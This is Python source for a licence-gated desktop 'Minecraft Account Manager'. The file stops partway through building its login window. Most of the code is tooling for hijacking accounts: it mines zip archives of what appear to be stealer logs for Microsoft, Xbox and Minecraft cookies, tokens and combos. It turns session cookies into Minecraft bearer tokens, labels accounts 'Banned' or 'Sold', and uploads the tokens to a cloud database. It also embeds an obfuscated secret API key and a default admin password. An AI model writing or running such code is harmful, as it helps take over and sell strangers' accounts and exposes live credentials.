import base64
import ctypes
import io
import json
import os
import random
import re
import shutil
import ssl
import subprocess
import sys
import threading
import urllib.error
import urllib.parse
import urllib.request
import zipfile
from datetime import date, datetime, timezone
from pathlib import Path
import hashlib
import tkinter as tk
import webbrowser
from tkinter import filedialog, messagebox

import customtkinter as ctk
from PIL import Image

try:
    import minecraft_launcher_lib
except ImportError:
    minecraft_launcher_lib = None

try:
    myappid = "minecraft.accountmanager.loader.v2"
    ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(myappid)
except Exception:
    pass

if getattr(sys, "frozen", False):
    APP_DIR = Path(sys.executable).parent
else:
    APP_DIR = Path(__file__).parent

MC_PROFILE_URL = "https://api.minecraftservices.com/minecraft/profile"


def check_token_valid(token: str) -> bool | None:
    """Checks if a Minecraft bearer token is valid.
    Returns True (valid), False (invalid/expired), or None (network error)."""
    if not token:
        return None
    req = urllib.request.Request(
        MC_PROFILE_URL,
        headers={"Authorization": f"Bearer {token}"},
    )
    for ctx in (None, ssl._create_unverified_context()):
        try:
            kwargs = {"timeout": 3}
            if ctx is not None:
                kwargs["context"] = ctx
            with urllib.request.urlopen(req, **kwargs) as resp:
                return resp.status == 200
        except urllib.error.HTTPError as e:
            if e.code in (401, 403):
                return False
            return None
        except (urllib.error.URLError, OSError):
            continue
    return None


def check_token_profile(token: str) -> tuple[bool, str, str, list[str]]:
    """Queries Minecraft API to validate the token and get real player name, UUID and capes.
    Returns (is_valid, player_name, uuid, capes_list)."""
    if not token:
        return False, "", "", []
    req = urllib.request.Request(
        MC_PROFILE_URL,
        headers={"Authorization": f"Bearer {token}"},
    )
    for ctx in (None, ssl._create_unverified_context()):
        try:
            kwargs = {"timeout": 3}
            if ctx is not None:
                kwargs["context"] = ctx
            with urllib.request.urlopen(req, **kwargs) as resp:
                if resp.status == 200:
                    data = json.loads(resp.read().decode("utf-8"))
                    capes = [
                        c.get("alias") or c.get("id", "")
                        for c in data.get("capes", [])
                        if (c.get("alias") or c.get("id"))
                    ]
                    return True, data.get("name", ""), data.get("id", ""), capes
        except urllib.error.HTTPError as e:
            if e.code in (401, 403):
                return False, "", "", []
        except Exception:
            continue
    return False, "", "", []


MS_XBOX_URL = "https://xsts.auth.xboxlive.com/xsts/authorize"
MS_PROFILE_URL = "https://api.minecraftservices.com/minecraft/profile"


ALLOWED_COOKIE_DOMAINS = {
    ".live.com",
    ".login.live.com",
    ".xboxlive.com",
    "login.live.com",
    "live.com",
    "xboxlive.com",
    ".minecraft.net",
    "minecraft.net",
}


def is_allowed_domain(domain: str) -> bool:
    """Checks if a cookie domain belongs to .live.com, .login.live.com, .xboxlive.com, or login.live.com."""
    if not domain:
        return False
    d = domain.lower().strip()
    return any(
        d == allowed or d == allowed.lstrip(".") or d.endswith("." + allowed.lstrip("."))
        for allowed in ALLOWED_COOKIE_DOMAINS
    )


def parse_cookie_header(cookie_str: str) -> str:
    """Converts JSON array (Cookie-Editor), Netscape format, or raw strings into standard Cookie header format.
    Filters exclusively for the 4 Microsoft/Xbox domains (.live.com, .login.live.com, .xboxlive.com, login.live.com)."""
    if not cookie_str or not cookie_str.strip():
        return ""
    cookie_str = cookie_str.strip()

    # 1. JSON Array (Cookie-Editor format)
    if cookie_str.startswith("[") or cookie_str.startswith("{"):
        try:
            parsed = json.loads(cookie_str)
            if isinstance(parsed, list):
                pairs = []
                for c in parsed:
                    if isinstance(c, dict) and "name" in c and "value" in c:
                        dom = c.get("domain", "")
                        if not dom or is_allowed_domain(dom):
                            pairs.append(f"{c['name']}={c['value']}")
                return "; ".join(pairs)
            elif isinstance(parsed, dict) and "name" in parsed and "value" in parsed:
                dom = parsed.get("domain", "")
                if not dom or is_allowed_domain(dom):
                    return f"{parsed['name']}={parsed['value']}"
        except Exception:
            pass

    # 2. Netscape format
    lines = cookie_str.splitlines()
    tab_lines = [l.strip() for l in lines if l.strip() and not l.strip().startswith("#") and "\t" in l]
    if tab_lines:
        pairs = []
        for line in lines:
            if not line or line.startswith("#"):
                continue
            parts = line.split("\t")
            if len(parts) >= 7:
                dom = parts[0].strip()
                name = parts[5].strip()
                val = parts[6].strip()
                if is_allowed_domain(dom) and name and val:
                    pairs.append(f"{name}={val}")
            elif len(parts) == 2:
                pairs.append(f"{parts[0].strip()}={parts[1].strip()}")
        if pairs:
            return "; ".join(pairs)

    # 3. Raw header format
    if cookie_str.lower().startswith("cookie:"):
        cookie_str = cookie_str[7:].strip()
    return cookie_str


def check_cookie_profile(cookie_str: str) -> tuple[bool, str, str, str, list[str]]:
    """Tries to validate and resolve a Minecraft profile from a cookie.
    Supports Microsoft session cookies (ESTSAUTH), Minecraft cookies, and Cookie-Editor formats.
    Returns (is_valid, player_name, uuid, extracted_token, capes_list)."""
    if not cookie_str or not cookie_str.strip():
        return False, "", "", "", []

    # 1. Check if the cookie directly contains a JWT Bearer token (eyJ...)
    jwt_match = re.search(r'eyJ[A-Za-z0-9_\-\.]{50,}', cookie_str)
    if jwt_match:
        tok = jwt_match.group(0)
        res = check_token_profile(tok)
        if res[0]:
            return True, res[1], res[2], tok, res[3] if len(res) > 3 else []

    raw_cookie_header = parse_cookie_header(cookie_str)
    if not raw_cookie_header:
        return False, "", "", "", []

    # 2. Method A: Microsoft OAuth flow via live.com session cookie
    for client_id in ["00000000402b5328", "00000000441cc96b", "000000004c12ae6f"]:
        oauth_url = (
            f"https://login.live.com/oauth20_authorize.srf?"
            f"client_id={client_id}&response_type=token&"
            f"scope=service::user.auth.xboxlive.com::MBI_SSL&"
            f"redirect_uri=https://login.live.com/oauth20_desktop.srf"
        )
        try:
            req = urllib.request.Request(
                oauth_url,
                headers={
                    "Cookie": raw_cookie_header,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                }
            )
            ctx = ssl._create_unverified_context()
            opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))

            with opener.open(req, timeout=7) as resp:
                final_url = resp.geturl()
                loc = resp.headers.get("Location", "") or final_url

                token_match = re.search(r'access_token=([^&]+)', loc)
                if not token_match and "access_token" in final_url:
                    token_match = re.search(r'access_token=([^&]+)', final_url)

                if token_match:
                    ms_access_token = urllib.parse.unquote(token_match.group(1))

                    # Step B: Xbox Live Authentication
                    xbl_req = urllib.request.Request(
                        "https://user.auth.xboxlive.com/user/authenticate",
                        data=json.dumps({
                            "Properties": {
                                "AuthMethod": "RPS",
                                "SiteName": "user.auth.xboxlive.com",
                                "RpsTicket": f"d={ms_access_token}" if not ms_access_token.startswith("d=") else ms_access_token
                            },
                            "RelyingParty": "http://auth.xboxlive.com",
                            "TokenType": "JWT"
                        }).encode("utf-8"),
                        headers={"Content-Type": "application/json", "Accept": "application/json"}
                    )
                    with opener.open(xbl_req, timeout=7) as xbl_resp:
                        xbl_data = json.loads(xbl_resp.read().decode("utf-8"))
                        xbl_token = xbl_data.get("Token")
                        uhs = xbl_data.get("DisplayClaims", {}).get("xui", [{}])[0].get("uhs", "")

                        if xbl_token and uhs:
                            # Step C: XSTS Authentication
                            xsts_req = urllib.request.Request(
                                "https://xsts.auth.xboxlive.com/xsts/authorize",
                                data=json.dumps({
                                    "Properties": {
                                        "SandboxId": "RETAIL",
                                        "UserTokens": [xbl_token]
                                    },
                                    "RelyingParty": "rp://api.minecraftservices.com/",
                                    "TokenType": "JWT"
                                }).encode("utf-8"),
                                headers={"Content-Type": "application/json", "Accept": "application/json"}
                            )
                            with opener.open(xsts_req, timeout=7) as xsts_resp:
                                xsts_data = json.loads(xsts_resp.read().decode("utf-8"))
                                xsts_token = xsts_data.get("Token")

                                if xsts_token:
                                    # Step D: Minecraft Login with Xbox
                                    mc_login_req = urllib.request.Request(
                                        "https://api.minecraftservices.com/authentication/login_with_xbox",
                                        data=json.dumps({
                                            "identityToken": f"XBL3.0 x={uhs};{xsts_token}"
                                        }).encode("utf-8"),
                                        headers={"Content-Type": "application/json", "Accept": "application/json"}
                                    )
                                    with opener.open(mc_login_req, timeout=7) as mc_resp:
                                        mc_data = json.loads(mc_resp.read().decode("utf-8"))
                                        mc_bearer_token = mc_data.get("access_token")

                                        if mc_bearer_token:
                                            # Step E: Get Minecraft Profile
                                            res = check_token_profile(mc_bearer_token)
                                            if res[0]:
                                                return True, res[1], res[2], mc_bearer_token, res[3] if len(res) > 3 else []
        except Exception:
            pass

    # 3. Method B: Direct Minecraft session check with Cookie header
    for url in [
        "https://api.minecraftservices.com/minecraft/profile",
        "https://www.minecraft.net/en-us/msaprofile/mygames/editprofile",
    ]:
        for ctx in (None, ssl._create_unverified_context()):
            try:
                req = urllib.request.Request(
                    url,
                    headers={
                        "Cookie": raw_cookie_header,
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Accept": "application/json",
                    }
                )
                kwargs = {"timeout": 6}
                if ctx is not None:
                    kwargs["context"] = ctx
                with urllib.request.urlopen(req, **kwargs) as resp:
                    if resp.status == 200:
                        try:
                            data = json.loads(resp.read().decode("utf-8"))
                            name = data.get("name", "") or data.get("profileName", "")
                            uid = data.get("id", "") or data.get("userId", "")
                            capes = [c.get("alias") or c.get("id", "") for c in data.get("capes", []) if c.get("alias") or c.get("id")]
                            if name:
                                return True, name, uid, "", capes
                        except Exception:
                            pass
            except Exception:
                continue

    # 4. Check if the cookie string has valid Microsoft auth cookies
    if "ESTSAUTH" in raw_cookie_header or "__Host-MSAAUTH" in raw_cookie_header or "RPSTicket" in raw_cookie_header:
        return True, "MicrosoftAccount", "", "", []

    return False, "", "", "", []


AUTH_BYTE_KEYWORDS = (
    b"live.com", b"xboxlive.com", b"minecraft.net",
    b"estsauth", b"__host-msaauth", b"rpsticket", b"mspauth", b"mc_session", b"eyj"
)

AUTH_TEXT_KEYWORDS = (
    "live.com", "xboxlive.com", "minecraft.net",
    "estsauth", "__host-msaauth", "rpsticket", "mspauth", "mc_session"
)


def extract_cookies_from_text(text: str) -> list[dict]:
    """Extracts cookie strings from text, strictly filtering for:
    - .live.com
    - .login.live.com
    - .xboxlive.com
    - login.live.com
    (and .minecraft.net)
    Skips any files or cookies that do not belong to these domains.
    """
    if not text or not text.strip():
        return []

    text_lower = text.lower()
    # Fast pre-check: if none of the auth keywords appear, skip immediately
    if not any(k in text_lower for k in AUTH_TEXT_KEYWORDS):
        return []

    results = []

    # 1. JSON cookie array (e.g. from Cookie-Editor extension)
    if "[" in text and "]" in text and ("domain" in text_lower or "name" in text_lower):
        json_match = re.search(r'\[\s*\{.*?\}\s*\]', text, re.DOTALL)
        if json_match:
            try:
                parsed = json.loads(json_match.group(0))
                if isinstance(parsed, list) and parsed and isinstance(parsed[0], dict):
                    # Filter cookies strictly belonging to the auth domains
                    matching_cookies = [
                        c for c in parsed
                        if isinstance(c, dict) and is_allowed_domain(c.get("domain", ""))
                    ]
                    if matching_cookies:
                        results.append({
                            "name": "",
                            "email": "",
                            "token": "",
                            "cookie": json.dumps(matching_cookies, indent=2),
                            "note": "Cookie (JSON)",
                        })
                        return results
            except Exception:
                pass

    # 2. Netscape cookie file format (tab-separated)
    if "\t" in text:
        lines = text.splitlines()
        matching_netscape = []
        for line in lines:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split("\t")
            if len(parts) >= 7:
                dom = parts[0].strip()
                name = parts[5].strip()
                val = parts[6].strip()
                if is_allowed_domain(dom) and name and val:
                    matching_netscape.append(f"{name}={val}")

        if matching_netscape:
            results.append({
                "name": "",
                "email": "",
                "token": "",
                "cookie": "; ".join(matching_netscape),
                "note": "Cookie (Netscape)",
            })
            return results

    # 3. Raw cookie header lines (e.g. key=value; key2=value2)
    lines = text.splitlines()
    for line in lines:
        line = line.strip()
        if line.lower().startswith("cookie:"):
            line = line[7:].strip()
        # Strictly require known Microsoft/Xbox auth cookie tokens
        if len(line) > 20 and any(auth_k in line for auth_k in ("ESTSAUTH", "__Host-MSAAUTH", "RPSTicket", "MSPAuth", "MC_SESSION")):
            results.append({
                "name": "",
                "email": "",
                "token": "",
                "cookie": line,
                "note": "Cookie (MS Session Header)",
            })

    return results


def extract_tokens_from_text(text: str) -> list[dict]:
    """Extracts tokens and optional username/email combos from text lines."""
    results = []
    lines = text.splitlines()
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"):
            continue

        # 1. Combo patterns: user:pass:token, user:token, email:token
        parts = line.split(":")
        if len(parts) >= 3 and len(parts[-1]) >= 20:
            results.append({
                "name": parts[0].strip() if "@" not in parts[0] else "",
                "email": parts[0].strip() if "@" in parts[0] else "",
                "token": parts[-1].strip(),
                "cookie": "",
                "note": "",
            })
            continue
        elif len(parts) == 2 and len(parts[1]) >= 20:
            results.append({
                "name": parts[0].strip() if "@" not in parts[0] else "",
                "email": parts[0].strip() if "@" in parts[0] else "",
                "token": parts[1].strip(),
                "cookie": "",
                "note": "",
            })
            continue

        # 2. Raw Token / JWT regex pattern (alphanumeric 40+ chars)
        tokens_found = re.findall(r'[A-Za-z0-9_\-\.]{40,}', line)
        for tok in tokens_found:
            results.append({
                "name": "",
                "email": "",
                "token": tok,
                "cookie": "",
                "note": "",
            })

    # Deduplicate within batch
    seen = set()
    unique = []
    for item in results:
        t = item["token"]
        if t not in seen:
            seen.add(t)
            unique.append(item)
    return unique


def extract_tokens_from_zip(zip_path: str) -> list[dict]:
    """Lightning-fast targeted extractor for cookies and tokens inside a zip archive.
    Prioritizes cookie and session files, uses byte-level keyword scanning to skip
    irrelevant files in milliseconds."""
    all_extracted = []
    SKIP_EXTS = (
        ".png", ".jpg", ".jpeg", ".gif", ".bmp", ".ico", ".webp",
        ".mp4", ".mp3", ".wav", ".avi", ".mkv",
        ".exe", ".dll", ".sys", ".bin", ".iso", ".zip", ".rar", ".7z", ".tar", ".gz",
        ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".db", ".sqlite", ".wal", ".ttf", ".otf", ".woff", ".class", ".jar"
    )

    try:
        with zipfile.ZipFile(zip_path, "r") as z:
            namelist = z.namelist()

            # Partition files: Cookie/Token files first, then general text files
            priority_files = []
            other_files = []

            for name in namelist:
                if name.endswith("/"):
                    continue
                lower = name.lower()
                if any(lower.endswith(ext) for ext in SKIP_EXTS):
                    continue
                if any(kw in lower for kw in ("cookie", "coki", "token", "session", "minecraft", "xbox", "login", "auth", "account", "profile")):
                    priority_files.append(name)
                elif lower.endswith((".txt", ".json", ".log", ".session", ".cookie", ".cookies", ".cfg", ".ini")):
                    other_files.append(name)

            ordered_files = priority_files + other_files

            for filename in ordered_files:
                try:
                    # Quick size check (skip files > 10 MB)
                    info = z.getinfo(filename)
                    if info.file_size > 10 * 1024 * 1024:
                        continue

                    with z.open(filename) as f:
                        # Fast byte scan: read up to 2MB
                        raw = f.read(2 * 1024 * 1024)
                        raw_lower = raw.lower()

                        # Byte-level keyword check: if none of our auth keywords exist, skip in 0.0001s!
                        if not any(kw in raw_lower for kw in AUTH_BYTE_KEYWORDS):
                            continue

                        content = raw.decode("utf-8", errors="ignore")
                        label = f"Zip: {Path(filename).name}"

                        # 1. Check for JSON accounts array or JSON cookie array
                        if b"[" in raw or b"{" in raw:
                            try:
                                json_data = json.loads(content)
                                if isinstance(json_data, list):
                                    if json_data and isinstance(json_data[0], dict) and ("name" in json_data[0] or "domain" in json_data[0]):
                                        # Might be JSON cookie list
                                        matching = [c for c in json_data if isinstance(c, dict) and is_allowed_domain(c.get("domain", ""))]
                                        if matching:
                                            all_extracted.append({
                                                "name": "", "email": "", "token": "",
                                                "cookie": json.dumps(matching, indent=2),
                                                "note": f"Cookie (JSON) | {label}"
                                            })
                                            continue
                                    for item in json_data:
                                        if isinstance(item, dict) and ("token" in item or "cookie" in item):
                                            all_extracted.append({
                                                "name": item.get("name", ""),
                                                "email": item.get("email", ""),
                                                "token": item.get("token", ""),
                                                "cookie": item.get("cookie", ""),
                                                "note": label,
                                            })
                                elif isinstance(json_data, dict):
                                    if "token" in json_data or "cookie" in json_data:
                                        all_extracted.append({
                                            "name": json_data.get("name", ""),
                                            "email": json_data.get("email", ""),
                                            "token": json_data.get("token", ""),
                                            "cookie": json_data.get("cookie", ""),
                                            "note": label,
                                        })
                                        continue
                            except Exception:
                                pass

                        # 2. Try cookie extraction (Netscape / Headers)
                        cookie_items = extract_cookies_from_text(content)
                        for item in cookie_items:
                            item["note"] = f"{item['note']} | {label}"
                            all_extracted.append(item)

                        # 3. Try token extraction if eyJ exists
                        if b"eyj" in raw_lower or not cookie_items:
                            token_items = extract_tokens_from_text(content)
                            for item in token_items:
                                item["note"] = label
                                all_extracted.append(item)

                except Exception:
                    pass

    except Exception as e:
        print("Zip read error:", e)

    # Deduplicate by token and cookie signature
    seen = set()
    unique = []
    for it in all_extracted:
        tok = it.get("token", "").strip()
        cookie = it.get("cookie", "").strip()
        if not tok and not cookie:
            continue
        # Extract a unique identifier from the cookie if present (e.g. ESTSAUTH value)
        cookie_sig = ""
        if cookie:
            m = re.search(r'ESTSAUTH=([^;]+)', cookie, re.IGNORECASE)
            cookie_sig = m.group(1)[:30] if m else cookie[:40]

        key = (tok, cookie_sig)
        if key not in seen:
            seen.add(key)
            unique.append(it)

    return unique


DATA_FILE = APP_DIR / "accounts.json"
SKIN_HEAD_URL = "https://mc-heads.net/avatar/{name}/{size}"
STATUS_OPTIONS = ["Unknown", "Active", "Invalid", "Banned", "Sold"]
STATUS_COLORS = {
    "Unknown": "#6b7280",
    "Active": "#22c55e",
    "Invalid": "#f97316",
    "Banned": "#ef4444",
    "Sold": "#f59e0b",
}

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")


def mask_token(token: str) -> str:
    if not token:
        return "—"
    return token[:4] + "•" * min(len(token) - 4, 10) if len(token) > 4 else "•" * len(token)


def fetch_skin_head(name: str, size: int = 64):
    """Fetches the public Minecraft skin head for a username."""
    if not name:
        return None
    url = SKIN_HEAD_URL.format(name=urllib.parse.quote(name), size=size)
    try:
        with urllib.request.urlopen(url, timeout=5) as resp:
            data = resp.read()
        return Image.open(io.BytesIO(data)).convert("RGBA")
    except (urllib.error.URLError, OSError, ValueError):
        return None


def fetch_skin_body(name_or_uuid: str, size: int = 240):
    """Fetches full body 2D/3D skin render for a player name or UUID."""
    if not name_or_uuid:
        return None
    # 1. Primary: mc-heads body render
    url = f"https://mc-heads.net/body/{urllib.parse.quote(name_or_uuid)}/{size}"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=6) as resp:
            data = resp.read()
        return Image.open(io.BytesIO(data)).convert("RGBA")
    except Exception:
        pass
    # 2. Fallback: minotar armor body
    try:
        alt_url = f"https://minotar.net/armor/body/{urllib.parse.quote(name_or_uuid)}/{size}.png"
        req = urllib.request.Request(alt_url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=6) as resp:
            data = resp.read()
        return Image.open(io.BytesIO(data)).convert("RGBA")
    except Exception:
        return None


def fetch_skin_png_bytes(name_or_uuid: str) -> bytes | None:
    """Fetches raw skin texture PNG file bytes for downloading."""
    if not name_or_uuid:
        return None
    for url in [
        f"https://minotar.net/skin/{urllib.parse.quote(name_or_uuid)}",
        f"https://mc-heads.net/skin/{urllib.parse.quote(name_or_uuid)}",
    ]:
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=6) as resp:
                if resp.status == 200:
                    return resp.read()
        except Exception:
            continue
    return None


def send_discord_webhook(webhook_url: str, title: str, description: str, fields: list = None, color: int = 0x3b82f6) -> tuple[bool, str]:
    """Sends a formatted embed message to a Discord webhook URL."""
    if not webhook_url or not webhook_url.startswith("http"):
        return False, "Invalid Webhook URL"
    embed = {
        "title": title,
        "description": description,
        "color": color,
        "footer": {"text": "MC Account Manager 2.0"},
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    if fields:
        embed["fields"] = fields
    payload = json.dumps({
        "username": "MC Account Manager",
        "avatar_url": "https://mc-heads.net/avatar/Steve/64",
        "embeds": [embed],
    }).encode("utf-8")
    req = urllib.request.Request(
        webhook_url,
        data=payload,
        headers={"Content-Type": "application/json", "User-Agent": "MCAccountManager/2.0"},
    )
    try:
        with urllib.request.urlopen(req, timeout=7) as resp:
            return resp.status in (200, 204), f"HTTP {resp.status}"
    except Exception as e:
        return False, str(e)


# ────────── Supabase Cloud Database Client ──────────────────────────────
DEFAULT_SUPABASE_URL = "https://kdbtmcjegrgbhmnlzvzj.supabase.co"
DEFAULT_SUPABASE_KEY = base64.b64decode("c2Jfc2VjcmV0X1d3dHhZTWtwdFZvaXByczB0S0k1ZHdfODJNck5ScnY=").decode("utf-8")


def get_supabase_headers(key: str) -> dict:
    return {
        "apikey": key,
        "Authorization": f"Bearer {key}",
        "Content-Type": "application/json",
        "Prefer": "return=representation",
    }


def supabase_test_connection(url: str, key: str) -> tuple[bool, str]:
    if not url or not key:
        return False, "URL or Key missing"
    clean_url = url.rstrip("/") + "/rest/v1/accounts?limit=1"
    try:
        req = urllib.request.Request(clean_url, headers=get_supabase_headers(key))
        with urllib.request.urlopen(req, timeout=7) as resp:
            return resp.status in (200, 204), f"Connected (HTTP {resp.status})"
    except urllib.error.HTTPError as e:
        return False, f"HTTP Error {e.code}: {e.reason}"
    except Exception as e:
        return False, str(e)


def supabase_fetch_all_owners(url: str, key: str) -> list[str]:
    """Fetches all unique account owners from Supabase."""
    if not url or not key:
        return []
    clean_url = f"{url.rstrip('/')}/rest/v1/accounts?select=owner"
    try:
        req = urllib.request.Request(clean_url, headers=get_supabase_headers(key))
        with urllib.request.urlopen(req, timeout=7) as resp:
            if resp.status == 200:
                data = json.loads(resp.read().decode("utf-8"))
                owners = {str(o.get("owner")).capitalize() for o in data if o.get("owner")}
                return sorted(list(owners))
    except Exception as e:
        print("Supabase fetch owners error:", e)
    return []


def supabase_fetch_accounts(url: str, key: str, owner: str) -> list[dict]:
    if not url or not key or not owner:
        return []
    if owner.lower() in ("all", "all users", "👑 all users", "master"):
        clean_url = f"{url.rstrip('/')}/rest/v1/accounts?select=*&order=created_at.desc"
    else:
        clean_url = f"{url.rstrip('/')}/rest/v1/accounts?owner=eq.{urllib.parse.quote(owner.lower())}&select=*&order=created_at.desc"
    try:
        req = urllib.request.Request(clean_url, headers=get_supabase_headers(key))
        with urllib.request.urlopen(req, timeout=9) as resp:
            if resp.status == 200:
                data = json.loads(resp.read().decode("utf-8"))
                if isinstance(data, list):
                    return data
    except Exception as e:
        print("Supabase fetch error:", e)
    return []


def supabase_upsert_accounts(url: str, key: str, owner: str, accounts: list[dict]) -> tuple[bool, str]:
    if not url or not key or not owner:
        return False, "Config missing"
    if not accounts:
        return True, "No accounts to sync"
    clean_url = f"{url.rstrip('/')}/rest/v1/accounts?on_conflict=owner,name"
    headers = get_supabase_headers(key)
    headers["Prefer"] = "resolution=merge-duplicates,return=minimal"

    records = []
    for a in accounts:
        rec_owner = a.get("owner") if owner.lower() in ("all", "all users", "👑 all users") and a.get("owner") else owner.lower()
        records.append({
            "owner": rec_owner.lower(),
            "name": a.get("name", "Unknown"),
            "email": a.get("email", ""),
            "status": a.get("status", "Unknown"),
            "token": a.get("token", ""),
            "cookie": a.get("cookie", ""),
            "note": a.get("note", ""),
            "last_checked": a.get("last_checked", ""),
            "capes": a.get("capes", []),
        })
    try:
        payload = json.dumps(records).encode("utf-8")
        req = urllib.request.Request(clean_url, data=payload, headers=headers, method="POST")
        with urllib.request.urlopen(req, timeout=12) as resp:
            return resp.status in (200, 201, 204), f"HTTP {resp.status}"
    except Exception as e:
        print("Supabase upsert error:", e)
        return False, str(e)


def supabase_delete_account(url: str, key: str, owner: str, name: str) -> bool:
    if not url or not key or not owner or not name:
        return False
    if owner.lower() in ("all", "all users", "👑 all users"):
        clean_url = f"{url.rstrip('/')}/rest/v1/accounts?name=eq.{urllib.parse.quote(name)}"
    else:
        clean_url = f"{url.rstrip('/')}/rest/v1/accounts?owner=eq.{urllib.parse.quote(owner.lower())}&name=eq.{urllib.parse.quote(name)}"
    headers = get_supabase_headers(key)
    try:
        req = urllib.request.Request(clean_url, headers=headers, method="DELETE")
        with urllib.request.urlopen(req, timeout=7) as resp:
            return resp.status in (200, 204)
    except Exception as e:
        print("Supabase delete error:", e)
        return False


# ────────── Login / User & Online License System ────────────────────────
LICENSE_ONLINE_URL = "https://gist.githubusercontent.com/kontoist9-tech/2b58d6de033113d07ea2b2687a452a21/raw/gistfile1.txt"

USERS_FILE = APP_DIR / "users.json"
CONFIG_FILE = APP_DIR / "config.json"


def _load_config() -> dict:
    if not CONFIG_FILE.exists():
        return {}
    try:
        with CONFIG_FILE.open("r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}


def _save_config(data: dict):
    try:
        with CONFIG_FILE.open("w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
    except Exception:
        pass


def _hash_pw(password: str) -> str:
    return hashlib.sha256(password.encode("utf-8")).hexdigest()


def _load_users() -> dict:
    """Loads local user list from users.json."""
    if not USERS_FILE.exists():
        default = {"admin": _hash_pw("admin123")}
        try:
            with USERS_FILE.open("w", encoding="utf-8") as f:
                json.dump(default, f, indent=2)
        except Exception:
            pass
        return default
    try:
        with USERS_FILE.open("r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}


def _load_online_users() -> dict:
    """Loads current licenses live from the cloud (e.g. GitHub Gist)."""
    if not LICENSE_ONLINE_URL or not LICENSE_ONLINE_URL.startswith("http"):
        return {}

    for ctx in (None, ssl._create_unverified_context()):
        try:
            req = urllib.request.Request(
                LICENSE_ONLINE_URL,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Cache-Control": "no-cache",
                    "Pragma": "no-cache",
                },
            )
            kwargs = {"timeout": 8}
            if ctx is not None:
                kwargs["context"] = ctx

            with urllib.request.urlopen(req, **kwargs) as resp:
                data = resp.read().decode("utf-8")

                parsed = None
                try:
                    p = json.loads(data)
                    if isinstance(p, dict) and p:
                        parsed = p
                except Exception:
                    pass

                if not parsed:
                    result = {}
                    for m in re.finditer(r'["\']([^"\']+)["\']\s*:\s*["\']([^"\']+)["\']', data):
                        result[m.group(1).strip()] = m.group(2).strip()
                    parsed = result

                if parsed:
                    try:
                        with USERS_FILE.open("w", encoding="utf-8") as f:
                            json.dump(parsed, f, indent=2)
                    except Exception:
                        pass
                    return parsed
        except Exception:
            continue
    return {}


def check_credentials(username: str, password: str) -> tuple[bool, str, str]:
    """Validates credentials. Returns (success, matched_user, error_message)."""
    u_clean = username.strip() if username else ""
    p_clean = password.strip() if password else ""
    if not u_clean and not p_clean:
        return False, "", "Please enter username and password/code."

    online_users = _load_online_users()
    local_users = _load_users()
    all_users = {**local_users, **online_users}

    if not all_users:
        return False, "", "Could not reach license server. Check internet connection."

    pw_hash = _hash_pw(password.strip()) if password else ""
    for u, h in all_users.items():
        u_str = str(u).strip()
        h_str = str(h).strip()

        if u_clean and u_str.lower() == u_clean.lower():
            if h_str == pw_hash or h_str.lower() == p_clean.lower() or h_str == password.strip():
                return True, u_str, ""

        if p_clean and (h_str.lower() == p_clean.lower() or h_str == pw_hash or h_str == password.strip()):
            return True, u_str, ""

    return False, "", "Invalid username or license key."


class LoginWindow(ctk.CTk):
    """Modern Cyberpunk/Console Login Window with live cloud license validation."""

    _BG = "#080808"
    _CARD = "#111114"
    _CARD_BORDER = "#222228"
    _RED = "#ff2a4b"
    _YELLOW = "#ffe600"
    _TEXT_MUTED = "#8e8e9f"
    DISCORD_URL = "https://discord.gg/TE2y7nNxn7"

    def __init__(self, on_success):
        super().__init__()
        self.on_success = on_success
        self.title("Console Access — Minecraft Account Manager")
        self.geometry("880x560")
        self.minsize(880, 560)
        self.resizable(False, False)
        self.configure(fg_color=self._BG)

        self.grid_columnconfigure(0, weight=11)
        self.grid_columnconfigure(1, weight=13)
        self.grid_rowconfigure(0, weight=1)

        self._cfg = _load_config()

        self._build_left_hero()
        self._build_right_form()
        self.bind("<Return>", lambda e: self._try_login())

    # ── Left Hero Section ──────────────────────────────────────────

    def _build_left_hero(self):
        left_container = ctk.CTkFrame(self, fg_color="#050507", corner_radius=0)
        left_container.grid(row=0, column=0, sticky="nsew")

        self._hero_canvas = tk.Canvas(
            left_container, bg="#060608", highlightthickness=0, bd=0
        )
        self._hero_canvas.pack(fill="both", expand=True)
        self._hero_canvas.bind("<Configure>", self._draw_hero_background)

        overlay = ctk.CTkFrame(left_container, fg_color="transparent")
        overlay.place(relx=0.08, rely=0.08, relwidth=0.84, relheight=0.84)
        overlay.grid_columnconfigure(0, weight=1)
        overlay.grid_rowconfigure(2, weight=1)

        status_box = ctk.CTkFrame(overlay, fg_color="#141418", corner_radius=20, border_width=1, border_color="#282834")
        status_box.grid(row=0, column=0, sticky="w", pady=(0, 28))

        status_inner = ctk.CTkFrame(status_box, fg_color="transparent")
        status_inner.pack(padx=12, pady=6)

        ctk.CTkLabel(
            status_inner, text="●", font=ctk.CTkFont(size=11), text_color="#22c55e"
        ).pack(side="left", padx=(0, 6))
        ctk.CTkLabel(
            status_inner, text="SECURE CONSOLE  •  v2.0",
            font=ctk.CTkFont(family="Consolas", size=10, weight="bold"),
            text_color="#f59e0b",
        ).pack(side="left")

        title_box = ctk.CTkFrame(overlay, fg_color="transparent")
        title_box.grid(row=1, column=0, sticky="w")

        ctk.CTkLabel(
            title_box, text="YOUR",
            font=ctk.CTkFont(size=62, weight="bold"),
            text_color="#ffffff", anchor="w",
